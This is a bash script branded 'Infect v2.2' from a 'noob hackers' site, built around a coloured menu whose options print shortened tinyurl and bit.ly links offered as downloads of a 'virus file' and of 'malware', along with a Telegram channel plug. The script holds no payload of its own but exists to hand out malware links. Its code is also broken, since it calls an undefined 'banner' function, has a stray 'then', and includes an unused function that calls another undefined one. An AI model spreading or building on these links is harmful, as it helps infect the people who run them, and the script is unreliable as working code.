# A tool by nitro from www.noob-hackers.com
# Be a unique person not copy cat
# Colours
#-----------------
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
# scripting start
baner1(){
clear
echo -e '\e[91m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@   Infect v2.2      @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        Noob Hackers
'
echo " " 
echo -e "$red                       ▶my channel Telegram =$grn @Filtering_Hacking $grn◀$rset"
echo -e "$red                      ⫸$ylo Tack Lorix $red ⫷$rset"
echo 
# Functions
echo " "
echo " "
}
menu(){
echo -e "$grn             ＞＞＞＞>>>＞$red < Viroses >$grn ＜<<<＜＜＜＜$rset"
echo " "
echo " "
echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Virus file"
echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Virus malware"
echo -e "$red                        ➡$cyan [\e[92m3\e[96m] Virus web"
echo " "
echo " "
echo -e "$grn               >＞＞＞＞＞$red < Filtering > $grn ＜＜＜＜＜<$rset"
echo " "
echo -ne "\e[93m#Chois your number\e[92m: "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
about
then
exit 1
else
echo "wrong"
exit
fi
}
virus(){
################
clear
echo
echo -e '\e[92m 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) '
echo " "
echo -e "\e[91m  links virus file :

         \e[95mL1NK :- \e[92mhttps://tinyurl.com/uppdatesnew
"
echo
echo -ne "\e[93m#Type 8 for exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e '\e[92m 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) '
echo " "
echo " "
echo -e "\e[91m  Link Download malware

        \e[95mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ
"
echo
echo -ne "\e[93m#Type8 for exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
about(){
clear
echo -e '\e[91m
         ──▐─▌──▐─▌──
         ─▐▌─▐▌▐▌─▐▌─
         ─█▄▀▄██▄▀▄█─
         ──▄──██▌─▄──
         ▄▀─█▀██▀█─▀▄
         ▐▌▐▌─▐▌─▐▌▐▌
         ─▐─█────█─▌─
         ────▌──▐────
'
echo -e "\e[91m              Viruses web :  " | pv -qL 10
echo -e "\e[92m              https:// " | pv -qL 10
sleep 6.0
banner
menu
}
vid(){
FILE=$HOME/infect/test.test
if [ -f "$FILE" ]; then
pop
else
echo
fi
}
banner
menu